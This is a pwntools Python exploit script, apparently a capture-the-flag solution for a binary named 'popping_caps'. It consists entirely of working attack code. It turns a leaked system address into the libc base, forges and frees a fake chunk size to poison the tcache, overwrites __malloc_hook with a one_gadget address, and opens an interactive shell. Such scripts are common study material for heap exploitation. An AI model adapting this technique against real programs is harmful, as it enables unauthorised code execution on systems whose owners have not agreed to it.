from pwn import * 
sh = process("./popping_caps") 
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    #bp = [0xea0,0xd31,0xc52]
    #bp = [0x00000dfb,0x00000b7c,0x00000d10]
    script = ""
    PIE = get_PIE(sh)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(sh,gdbscript=script) 

def add(size) : 
    sh.recv() 
    sh.sendline("1") 
    sh.recv()
    sh.sendline(str(size))  

def free(id) : 
    sh.recv() 
    sh.sendline("2") 
    sh.recv() 
    sh.sendline(str(id))

def edit(content) : 
    sh.recv() 
    sh.sendline("3") 
    sh.recv() 
    sh.send(content) 

sh.recvuntil("Here is system ") 
system = eval(sh.recv(14)) 

libc.address = system - libc.sym['system']
malloc_hook = libc.sym['__malloc_hook']
one_gadget = libc.address + 0x10a38c 

log.success("System = " + hex(system)) 
log.success("Libc = " + hex(libc.address))

# debug([0xc13, 0xc49, 0xbd5]) 
add(0x3a8) 
free(0)             # set fake size 
free(-0x210)        # free fake size 
add(0xF8) 
edit(p64(malloc_hook))  #    
add(0x18)               # dup to malloc hook 
edit(p64(one_gadget)) 

sh.interactive()